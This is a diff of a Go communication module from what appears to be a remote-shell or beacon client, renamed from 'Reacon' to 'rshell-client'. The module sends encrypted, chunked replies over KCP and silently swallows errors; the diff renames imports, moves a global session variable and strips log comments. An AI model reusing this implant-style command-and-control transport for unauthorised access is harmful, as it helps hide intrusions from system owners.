@@ -1,14 +1,17 @@
 package communication
 
 import (
-	"Reacon/pkg/encrypt"
-	"Reacon/pkg/utils"
+	"rshell-client/shared/encrypt"
+	"rshell-client/shared/utils"
 	"bytes"
 	"encoding/binary"
 	"fmt"
-	"github.com/xtaci/kcp-go/v5"
 	"sync"
+
+	"github.com/xtaci/kcp-go/v5"
 )
+
+var KCPClient *kcp.UDPSession
 
 func ErrorProcess(err error) {
 	errMsgBytes := []byte(err.Error())
@@ -47,18 +50,16 @@ func criticalSection(callbackType int, b []byte) {
 	normalDataBytes := utils.WriteInt(normalDataInt)
 	msgToSend := utils.BytesCombine(normalDataBytes, msg)
 
-	Send(msgToSend, utils.KCPClient)
+	Send(msgToSend, KCPClient)
 	mutex.Unlock()
 }
 func Send(msg []byte, conn *kcp.UDPSession) {
 	defer func() {
 		if err := recover(); err != nil {
-			//log.Println("Send error:", err)
 		}
 	}()
 
 	if conn == nil {
-		//log.Println("Connection not established")
 		return
 	}
 
@@ -67,7 +68,7 @@ func Send(msg []byte, conn *kcp.UDPSession) {
 
 	msgToSend := utils.BytesCombine(bufferSizeBytes, msg)
 
-	const chunkSize = 50 * 1024 // 50 KB
+	const chunkSize = 50 * 1024
 	var chunk []byte
 
 	for bytesSent := 0; bytesSent < len(msgToSend); {
@@ -79,7 +80,6 @@ func Send(msg []byte, conn *kcp.UDPSession) {
 
 		_, err := conn.Write(chunk)
 		if err != nil {
-			//log.Println("Failed to send data:", err)
 			return
 		}
 
@@ -88,7 +88,6 @@ func Send(msg []byte, conn *kcp.UDPSession) {
 
 }
 
-// replyType(4) | result  并加密
 func MakePacket(replyType int, b []byte) []byte {
 	buf := new(bytes.Buffer)
 
